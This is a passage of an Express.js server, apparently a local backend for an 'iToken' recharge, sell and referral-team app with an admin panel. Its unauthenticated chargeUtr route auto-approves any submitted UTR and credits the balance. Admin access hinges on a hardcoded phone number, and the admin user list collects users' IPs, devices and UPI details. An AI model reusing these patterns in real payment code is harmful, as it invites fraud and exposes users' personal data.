    currentStep: 0,
    payer_status: 1
  });
  await tx.save();
  
  return res.json({
    code: 0,
    msg: 'success',
    data: rptNo
  });
});

app.get('/xxapi/rechargeToken', async (req, res) => {
  const rptNo = req.query.rptNo || req.body.rptNo;
  const tx = await Transaction.findOne({ rptNo });
  if (!tx) {
    return res.json({ code: 404, msg: 'Transaction not found' });
  }
  return res.json({
    code: 0,
    msg: 'success',
    data: tx
  });
});

app.get('/xxapi/chargeUtr/:rptNo/:utr', async (req, res) => {
  const { rptNo, utr } = req.params;
  const tx = await Transaction.findOne({ rptNo });
  if (!tx) return res.json({ code: 404, msg: 'Transaction not found' });
  
  tx.utr = utr;
  tx.currentStep = 2; // review step
  tx.payer_status = 3; // Success! Auto-approve for amazing UX
  await tx.save();
  
  // Instant local credit to user balance
  const user = await User.findOne({ phone: tx.phone });
  if (user) {
    user.balance = (user.balance || 0) + tx.amount;
    await user.save();
  }
  
  return res.json({ code: 0, msg: 'success', data: tx });
});

app.get('/xxapi/chargeCancel/:rptNo', async (req, res) => {
  const { rptNo } = req.params;
  const tx = await Transaction.findOne({ rptNo });
  if (!tx) return res.json({ code: 404, msg: 'Transaction not found' });
  
  tx.payer_status = 4; // Cancelled
  await tx.save();
  return res.json({ code: 0, msg: 'success' });
});

app.get('/xxapi/chargeStatus/:rptNo', async (req, res) => {
  const { rptNo } = req.params;
  const tx = await Transaction.findOne({ rptNo });
  if (!tx) return res.json({ code: 404, msg: 'Transaction not found' });
  return res.json({ code: 0, msg: 'success', data: tx.payer_status });
});

app.get('/xxapi/chargeToken/history', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const txs = await Transaction.find({ userId: user._id, type: 'recharge' }).sort({ ctime: -1 });
  return res.json({ code: 0, msg: 'success', data: txs });
});

app.get('/xxapi/transferToken/history', async (req, res) => {
  return res.json({ code: 0, msg: 'success', data: [] });
});

// 11. SELL AND WITHDRAWAL ENDPOINTS
app.get('/xxapi/sell/history', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const txs = await Transaction.find({ userId: user._id, type: 'sell' }).sort({ ctime: -1 });
  return res.json({ code: 0, msg: 'success', data: txs });
});

app.post('/xxapi/sell/question', async (req, res) => {
  return res.json({ code: 0, msg: 'success' });
});

app.get('/xxapi/minSellIToken/:param1/:param2', (req, res) => {
  return res.json({ code: 0, msg: 'success', data: 100 });
});

app.get('/xxapi/minMaxUpiSell/:param1/:param2/:param3', (req, res) => {
  return res.json({ code: 0, msg: 'success', data: { min: 100, max: 100000 } });
});

// 12. TEAM & LOGISTICS
app.get('/xxapi/teaminfo', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) {
    return res.json({ code: 403, msg: 'Unauthorized' });
  }
  const teamWorkId = user.phone;
  const inviteCode = user.invitercode || '123456';

  return res.json({
    code: 0,
    msg: "success",
    data: {
      teaminfo: {
        recharge: 0,
        dividend: 0,
        reward: 0,
        bonus: 0,
        teamWorkId: teamWorkId,
        count: 0
      },
      today: {
        recharge: 0,
        dividend: 0,
        reward: 0,
        bonus: 0
      },
      yesterday: {
        recharge: 0,
        dividend: 0,
        reward: 0,
        bonus: 0
      },
      inviteCode: inviteCode,
      rsUrl: "https://web.tezflow.vip/#/register?code=",
      teamSize: 0,
      totalRecharge: 0,
      totalWithdraw: 0,
      todayActiveCount: 0,
      yesterdayActiveCount: 0,
      commissionRate: "1.2%",
      level1Count: 0,
      level2Count: 0,
      level3Count: 0
    }
  });
});

app.get('/xxapi/teaminfothree/:param', (req, res) => {
  return res.json({ code: 0, msg: 'success', data: [] });
});

app.get('/xxapi/myTeam', async (req, res) => {
  return res.json({ code: 0, msg: 'success', data: [] });
});

app.get('/xxapi/quotaLog', async (req, res) => {
  return res.json({ code: 0, msg: 'success', data: [] });
});

// 13. NEWS & OTHER HELPERS
app.get('/xxapi/news/code/:code', (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      id: 32,
      cover: "",
      name: "securityupdate",
      code: req.params.code,
      type: 1,
      content: "All services running securely. Local fast trading enabled.",
      crtDate: 1779259339,
      crtUser: "Admin",
      sort: 4
    }
  });
});

app.get('/xxapi/bguide/guides', (req, res) => {
  const defaultGuides = [
    { id: 1, name: 'Bind Telegram Username', activityCode: 'newbie_Bind_Tgid', title: 'Bind Telegram Username', reward: 50, status: 'done' },
    { id: 2, name: 'Contact Customer Service', activityCode: 'newbie_tg_customer', title: 'Contact Customer Service', reward: 50, status: 'done' },
    { id: 3, name: 'Watch Video Tutorial', activityCode: 'newbie_watch_video', title: 'Watch Video Tutorial', reward: 50, status: 'done' },
    { id: 4, name: 'Join Telegram Channel', activityCode: 'newbie_tg_channel', title: 'Join Telegram Channel', reward: 50, status: 'done' },
    { id: 5, name: 'Pin Channel', activityCode: 'newbie_pin', title: 'Pin Channel', reward: 50, status: 'done' },
    { id: 6, name: 'Bind UPI/Bank Account', activityCode: 'newbie_newct', title: 'Bind UPI/Bank Account', reward: 100, status: 'done' },
    { id: 7, name: 'First Buy iToken', activityCode: 'newbie_buyitoken', title: 'First Buy iToken', reward: 200, status: 'done' },
    { id: 8, name: 'Invite Friends', activityCode: 'newbie_invite', title: 'Invite Friends', reward: 150, status: 'done' }
  ];

  return res.json({
    code: 0,
    msg: 'success',
    data: {
      reward: "200",
      can_reward: false,
      guides: defaultGuides,
      tgGroup: "https://t.me/xxxx",
      newbieReward: 200,
      buyToken: "0",
      activityRecord: {
        done: 0,
        condition: 0,
        settleAmt: 0,
        params: JSON.stringify({
          newbie_Bind_Tgid: 1,
          newbie_tg_customer: 1,
          newbie_watch_video: 1,
          newbie_tg_channel: 1,
          newbie_pin: 1,
          newbie_newct: 1,
          newbie_buyitoken: 1,
          newbie_invite: 1
        })
      },
      allDone: false,
      activityRules: defaultGuides
    }
  });
});

app.get('/xxapi/todayProfit', (req, res) => {
  return res.json({ code: 0, msg: 'success', data: { todayProfit: 0 } });
});

app.get('/xxapi/unread_list', (req, res) => res.json({ code: 0, msg: "success", data: [] }));
app.get('/xxapi/all_list', (req, res) => res.json({ code: 0, msg: "success", data: [] }));


// Route for favicon.ico to serve a high-quality PNG instead of an .ico file, preventing Canvas drawing errors
app.get('/favicon.ico', (req, res) => {
  return res.sendFile(path.join(currentDirname, 'static', 'images', 'logo.png'));
});

// Dynamic fallback handler for missing static icon or image assets to prevent image load errors
app.get(['/static/icon/:filename', '/static/images/:filename', '/assets/:filename'], (req, res) => {
  const filename = req.params.filename;
  const rootDir = process.cwd();
  
  // Try to find the file in physical directories, prioritizing the requested directory
  const pathsToTry = [];
  if (req.path.startsWith('/static/icon/')) {
    pathsToTry.push(path.join(rootDir, 'static', 'icon', filename));
    pathsToTry.push(path.join(currentDirname, 'static', 'icon', filename));
    pathsToTry.push(path.join(rootDir, 'static', 'images', filename));
    pathsToTry.push(path.join(currentDirname, 'static', 'images', filename));
  } else if (req.path.startsWith('/static/images/')) {
    pathsToTry.push(path.join(rootDir, 'static', 'images', filename));
    pathsToTry.push(path.join(currentDirname, 'static', 'images', filename));
    pathsToTry.push(path.join(rootDir, 'static', 'icon', filename));
    pathsToTry.push(path.join(currentDirname, 'static', 'icon', filename));
  } else if (req.path.startsWith('/assets/')) {
    pathsToTry.push(path.join(rootDir, 'assets', filename));
    pathsToTry.push(path.join(currentDirname, 'assets', filename));
  }
  
  // General fallback paths
  pathsToTry.push(path.join(rootDir, 'static', 'images', filename));
  pathsToTry.push(path.join(currentDirname, 'static', 'images', filename));
  pathsToTry.push(path.join(rootDir, 'static', 'icon', filename));
  pathsToTry.push(path.join(currentDirname, 'static', 'icon', filename));
  pathsToTry.push(path.join(rootDir, 'assets', filename));
  pathsToTry.push(path.join(currentDirname, 'assets', filename));
  pathsToTry.push(path.join(rootDir, filename));
  pathsToTry.push(path.join(currentDirname, filename));
  
  let foundPath = null;
  for (const p of pathsToTry) {
    if (fs.existsSync(p)) {
      foundPath = p;
      break;
    }
  }
  
  if (foundPath) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    return res.sendFile(foundPath);
  }
  
  // If not found physically, return a safe placeholder for images to avoid HTML 404 falling back to index.html
  const ext = path.extname(filename).toLowerCase();
  if (['.png', '.jpg', '.jpeg', '.svg', '.gif'].includes(ext)) {
    const nameWithoutExt = path.basename(filename, ext);
    const cleanName = nameWithoutExt.toUpperCase();
    
    let sum = 0;
    for (let i = 0; i < cleanName.length; i++) {
      sum += cleanName.charCodeAt(i);
    }
    const colors = ['#198cff', '#00b900', '#f0b90b', '#ff4d4f', '#722ed1', '#eb2f96', '#13c2c2', '#fa8c16'];
    const bg = colors[sum % colors.length];
    
    let label = cleanName;
    if (label.length > 4) {
      label = label.substring(0, 3);
    }
    
    const svg = `
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
        <rect width="100" height="100" rx="20" fill="${bg}"/>
        <text x="50" y="55" font-family="-apple-system, sans-serif" font-size="28" font-weight="bold" fill="#ffffff" text-anchor="middle" dominant-baseline="middle">${label}</text>
      </svg>
    `.trim();
    
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Content-Type', 'image/svg+xml');
    return res.send(svg);
  }
  
  return res.status(404).end();
});

// Admin Authentication Middleware
async function requireAdmin(req, res, next) {
  try {
    const user = await getUserByToken(req);
    if (!user || user.phone !== '7870873927') {
      return res.status(403).json({ code: 403, msg: 'Access denied. Admin only.' });
    }
    req.adminUser = user;
    next();
  } catch (err) {
    console.error('requireAdmin error:', err);
    return res.status(500).json({ code: 500, msg: 'Internal server error' });
  }
}

// 1. Serves the file admin.html directly
app.get('/admin', (req, res) => {
  res.sendFile(path.join(currentDirname, 'admin.html'));
});

// 2. Admin Stats
app.get('/xxapi/admin/stats', requireAdmin, async (req, res) => {
  try {
    const totalUsers = await User.countDocuments();
    const stats = await User.aggregate([
      {
        $group: {
          _id: null,
          totalBalance: { $sum: "$balance" },
          totalRecharge: { $sum: "$recharge" }
        }
      }
    ]);
    
    const totalBalance = stats[0] ? stats[0].totalBalance : 0;
    const totalRecharge = stats[0] ? stats[0].totalRecharge : 0;
    
    const kycVerified = await User.countDocuments({ kycStatus: 1 });
    
    const todayStart = new Date();
    todayStart.setHours(0, 0, 0, 0);
    const todayRegistrations = await User.countDocuments({ createdAt: { $gte: todayStart } });
    
    return res.json({
      code: 0,
      msg: 'success',
      data: {
        totalUsers,
        totalBalance,
        totalRecharge,
        kycVerified,
        todayRegistrations
      }
    });
  } catch (err) {
    console.error('Admin stats error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// 3. Admin Users List with Search
app.get('/xxapi/admin/users', requireAdmin, async (req, res) => {
  try {
    const { search } = req.query;
    let filter = {};
    if (search && String(search).trim() !== '') {
      const trimmed = String(search).trim();
      if (mongoose.Types.ObjectId.isValid(trimmed)) {
        filter = { _id: trimmed };
      } else {
        filter = { 
          $or: [
            { phone: new RegExp(trimmed, 'i') }, 
            { mobileNo: new RegExp(trimmed, 'i') }
          ] 
        };
      }
    }
    
    const users = await User.find(filter).sort({ createdAt: -1 }).limit(50);
    
    // Enrich users with IP, device info from logs
    const enrichedUsers = await Promise.all(users.map(async (user) => {
      const latestLog = await GeneralLog.findOne({
        $or: [
          { "body.phone": user.phone },
          { "body.phone": user.mobileNo },
          { "headers.token": user.token },
          { "headers.indiatoken": user.token }
        ]
      }).sort({ timestamp: -1 });
      
      return {
        _id: user._id,
        phone: user.phone || user.mobileNo || 'N/A',
        balance: user.balance || 0,
        recharge: user.recharge || 0,
        vipLevel: user.vipLevel || 1,
        kycStatus: user.kycStatus || 0,
        realName: user.realName || user.fullName || '',
        upiDetails: user.upiDetails || [],
        net: user.net || 'WiFi/Cellular',
        ip: latestLog ? latestLog.ip : 'N/A',
        deviceType: latestLog && latestLog.headers ? latestLog.headers['user-agent'] : 'N/A',
        createdAt: user.createdAt
      };
    }));
    
    return res.json({
      code: 0,
      msg: 'success',
      data: enrichedUsers
    });
  } catch (err) {
    console.error('Admin users error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// 4. Admin Update User Balance
app.post('/xxapi/admin/updateBalance', requireAdmin, async (req, res) => {
  try {
    const { userId, phone, amount, type } = req.body; // type: 'add' | 'subtract' | 'set'
    let filter = {};
    if (userId) filter._id = userId;
    else if (phone) filter = { $or: [{ phone }, { mobileNo: phone }] };
    else {
      return res.json({ code: 400, msg: 'User ID or Phone is required' });
    }
    
    const user = await User.findOne(filter);
    if (!user) {
      return res.json({ code: 404, msg: 'User not found' });
    }
    
    const val = parseFloat(amount);
    if (isNaN(val)) {
      return res.json({ code: 400, msg: 'Invalid amount' });
    }
    
    if (type === 'add') {
      user.balance = (user.balance || 0) + val;
    } else if (type === 'subtract') {
      user.balance = (user.balance || 0) - val;
    } else if (type === 'set') {
      user.balance = val;
    } else {
      return res.json({ code: 400, msg: 'Invalid operation type' });
    }
    
    await user.save();
    return res.json({ code: 0, msg: 'Balance updated successfully', balance: user.balance });
  } catch (err) {
    console.error('Update balance error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// Generic fallback for any other unhandled xxapi requests
app.all('/xxapi/*', async (req, res) => {
  console.log(`[Local API Fallback] ${req.method} called on ${req.originalUrl}`, req.body);
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

// Serve static assets from the current directory
app.use(express.static(currentDirname));

// For SPA routing fallback to index.html
app.get('*', (req, res) => {
  const urlPath = req.path.toLowerCase();
  
  // If it's an image request or a static file request that wasn't handled, do not serve index.html
  const isImage = /\.(png|jpg|jpeg|gif|svg|ico)$/i.test(urlPath);
  const isStaticAsset = urlPath.includes('/static/') || urlPath.includes('/assets/') || /\.(css|js|woff|woff2|ttf|json)$/i.test(urlPath);
  
  if (isImage) {
    const filename = path.basename(req.path);
    const ext = path.extname(filename).toLowerCase() || '.png';
    const nameWithoutExt = path.basename(filename, ext) || 'IMG';
    const cleanName = nameWithoutExt.toUpperCase();
    
    let sum = 0;
    for (let i = 0; i < cleanName.length; i++) {
      sum += cleanName.charCodeAt(i);
    }
    const colors = ['#198cff', '#00b900', '#f0b90b', '#ff4d4f', '#722ed1', '#eb2f96', '#13c2c2', '#fa8c16'];
    const bg = colors[sum % colors.length];
    
    let label = cleanName;
    if (label.length > 4) {
      label = label.substring(0, 3);
    }
    
    const svg = `
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
        <rect width="100" height="100" rx="20" fill="${bg}"/>
        <text x="50" y="55" font-family="-apple-system, sans-serif" font-size="28" font-weight="bold" fill="#ffffff" text-anchor="middle" dominant-baseline="middle">${label}</text>
      </svg>
    `.trim();
    
    res.setHeader('Content-Type', 'image/svg+xml');
    return res.send(svg);
  }
  
  if (isStaticAsset) {
    return res.status(404).send('Not Found');
  }
  
  res.sendFile(path.join(currentDirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on http://0.0.0.0:${PORT}`);
});

export default app;
